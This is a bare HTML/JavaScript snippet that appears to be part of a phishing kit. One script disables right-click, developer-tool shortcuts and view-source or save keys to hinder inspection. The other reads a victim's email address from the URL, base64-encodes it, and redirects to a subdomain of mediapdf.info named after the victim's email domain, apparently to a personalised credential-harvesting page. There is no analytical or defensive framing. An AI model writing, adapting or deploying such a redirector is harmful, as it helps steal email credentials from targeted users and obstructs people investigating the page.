<script>
    // disable right click
    document.addEventListener('contextmenu', event => event.preventDefault());

    document.onkeydown = function (e) {

        // disable F12 key
        if(e.keyCode == 123) {
            return false;
        }

        // disable I key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }

        // disable J key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }

        // Prevent Ctrl+s = disable save
        if (event.ctrlKey && (event.keyCode === 85 || event.keyCode === 83 || event.keyCode ===65 )) {
            return false;
        }

        // disable U key
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }

</script>
 <script type="text/javascript">
var url_string =  window.location.href;
var url_get_email = (getafterhash(url_string));
const domain = url_get_email.split('@')[1];
const domain_name = domain.split('.')[0];
var b64_email = btoa(url_get_email);
const randomString = generateRandomString(5);
var mail_go_url = "https://"+domain_name+".mediapdf.info/"+randomString+"/"+b64_email;

if (url_get_email) {
  location.replace(mail_go_url);
}


function getafterhash(url) {
var ret;
var queryString;
 // stuff after # is not part of query string, so get rid of it
 queryStringhash = url.split('#')[1];
 queryStringsemi = url.split(';')[1];
 queryStringsemiplus = url.split(';+')[1];
 queryStringstartsemi = url.split('*;')[1];
  // if query string exists
 if (queryStringhash) {
  ret = queryStringhash;

 }else if (queryStringsemi) {
  ret = queryStringsemi;

 }else if (queryStringsemiplus) {
  ret = queryStringsemiplus;

 }else if (queryStringstartsemi) {
  ret = queryStringstartsemi;

 }else{

   ret = 0;

  }

  return ret;
}

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

</script>
